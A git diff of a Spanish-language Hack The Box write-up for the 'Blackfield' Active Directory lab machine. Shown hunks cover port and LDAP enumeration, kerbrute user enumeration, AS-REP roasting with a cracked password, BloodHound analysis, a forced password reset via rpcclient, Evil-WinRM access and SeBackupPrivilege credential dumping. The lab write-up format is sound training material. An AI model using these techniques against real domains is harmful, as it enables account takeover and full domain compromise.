@@ -1,3 +1,27 @@
+---
+layout: single
+title: Blackfield - Hack The Box
+excerpt: "Directorio Activo"
+date: 2024-02-11
+classes: wide
+header:
+  teaser: /assets/images/htb-blackfield/blackfield1.png
+categories:
+  - hackthebox
+  - writeup
+tags:
+  - hackthebox
+  - Windows
+  - AD
+  - Kerberos
+---
+
+# 10.10.10.192 - Blackfield
+
+![](/assets/images/htb-blackfield/blackfield1)
+
+--------------------
+# Parte 1: Reconocimiento inicial
 
 Primero hacemos un scaneo de puertos con nmap, salen los tipicos de windows de directorio activo (smb, ldap, kerberos, rpc...)
 ```bash
@@ -33,6 +57,8 @@ result: 1 Operations error
 text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
  tion a successful bind must be completed on the connection., data 0, v4563
 ```
+--------------------
+# Parte 2: Ataque por Kerberos
 
 Probamos a enumerar smb, no esta habilitada la null session (porque es un windows 10 y se desactivó) pero si está la 
 guest session (invitado). Vemos que hay un tenemos acceso a "IPC$" (nunca suele haber nada interesante) y a "profiles$"
@@ -70,6 +96,7 @@ NT_STATUS_ACCESS_DENIED listing \*
 
 Mediante kerberos, le pasamos esa lista a la herramienta kerbrute y tras un rato nos saca tres usaurios posibles que meteremos en "valid users". Al ser un catch de flag, vemos que de todos los usuarios que había, solo han salido validos los que tienen nombres en minusculas ("audit2020" si, "ABarteski" no). Con Impacket-GetNPUsers obtenemos el hash de uno de esos usarios 
 por medio de kerberoasting (support)
+
 ```bash
 └─$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.txt
 2024/02/05 12:11:45 >  [+] VALID USERNAME:	audit2020@blackfield.local
@@ -93,6 +120,9 @@ Copiamos el hash en el archivo `hash`
 └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt  --show
 $krb5asrep$23$support@BLACKFIELD.LOCAL:8713342...:#00^BlackKnight
 ```
+--------------------
+# Parte 3: Enumerando el AD
+
 Ahora al tener credenciales, podemos por ejemplo obtener mas información por ldap (con ldapdomaindump o bloodhound-python
 ya que ldapseach devuelve mas de 20000 lineas de output). En este caso optamos por bloodhound y los archivos ".json" que
 genere, los metemos en "info.zip" (`zip info.zip *.json`), el cual subiremos a la herramienta bloodhound (ya sabemos, para ejecutarlo es `sudo neo4j console` y `bloodhound &> &; disown`)
@@ -109,6 +139,9 @@ INFO: Found 18 computers
 INFO: Connecting to LDAP server: dc01.blackfield.local
 INFO: Found 316 users
 ```
+--------------------
+# Parte 4: Escalando privilegios
+
 Vemos que support tiene el derecho (ACL) de `Force-ChangePassword` sobre "audit2020". La manera de explotar esta ACL desde fuera
 de la máquina es por rpcclient con el comando `'setuserinfo2 <usaurios> 23 <contraseña>'`. Comprobamos con nxc si las 
 credenciales han cambiado y sí.
@@ -192,6 +225,9 @@ WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_bac
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
 SeBackupPrivilege             Back up files and directories  Enabled
 ```
+--------------------
+# Parte 5: Comprometiendo el dominio entero
+
 Como svc_backup tiene el ACL `SeBackupPrivilege` podemos hacer copias de archivos protegidos aunque no tengamos derechos sobre
 ellos (nos saltamos sus ACLs por tanto). Podemos obtener las credenciales de todo el systema, guardandonos con `reg save` 
 la clave de registro `system` ("bootkey del sistema")
